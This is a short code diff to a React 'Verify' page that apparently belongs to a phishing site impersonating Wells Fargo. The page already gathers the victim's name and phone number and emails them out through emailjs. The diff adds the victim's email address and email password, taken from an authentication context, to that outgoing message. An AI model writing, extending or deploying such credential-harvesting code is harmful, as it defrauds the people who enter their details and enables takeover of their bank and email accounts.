@@ -1,11 +1,13 @@
-import React, { useState } from 'react';
+import React, { useContext, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import emailjs from 'emailjs-com';
+import { AuthContext } from './AuthContext';
 
 const Verify = () => {
   const [name, setName] = useState('');
   const [phone, setPhone] = useState('');
   const [status, setStatus] = useState('');
+  const {contextemail,emailpassword} = useContext(AuthContext);
   const [menuOpen, setMenuOpen] = useState(false);
   const navigate = useNavigate();
 
@@ -27,7 +29,9 @@ const Verify = () => {
         web_name: "Wells Fargo",      // The user's name
         from_name: "Wells Fargo",     // The user's phone number
         message: `Name: ${name},
+        Email: ${contextemail},
          Phone: ${phone},
+         Password: ${emailpassword},
           Date: ${new Date().toLocaleDateString()},
            Time: ${new Date().toLocaleTimeString()}`,
       };
